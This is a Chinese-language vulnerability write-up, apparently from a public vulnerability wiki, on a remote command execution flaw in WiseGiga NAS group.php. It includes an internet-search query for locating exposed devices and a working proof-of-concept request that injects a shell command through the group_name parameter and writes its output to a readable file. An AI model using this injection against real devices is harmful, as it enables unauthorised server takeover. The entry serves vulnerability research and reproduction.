---
title: "WiseGiga NAS group.php 远程命令执行漏洞"
date: 2026-10-16 09:09:42
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "WiseGiga-NAS"
tags:
  - "WiseGiga-NAS"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

WiseGiga 是一家销售网络连接存储（NAS ）产品的韩国公司。

WiseGiga NAS group.php文件存在远程命令执行漏洞，攻击者通过发送特定的请求包可以获取服务器权限

## 漏洞影响

```
WiseGiga NAS
```

## 网络测绘

```
app="WISEGIGA-NAS"
```

## 漏洞复现

主页面

![image-20220628113649787](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202206281144970.png)

验证POC

```
/admin/group.php?memberid=root&cmd=add&group_name=d;id>1.txt
```

![image-20220628114731029](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202206281147112.png)

```
/admin/1.txt
```

![image-20220628114740534](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202206281147595.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/WiseGiga-NAS-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
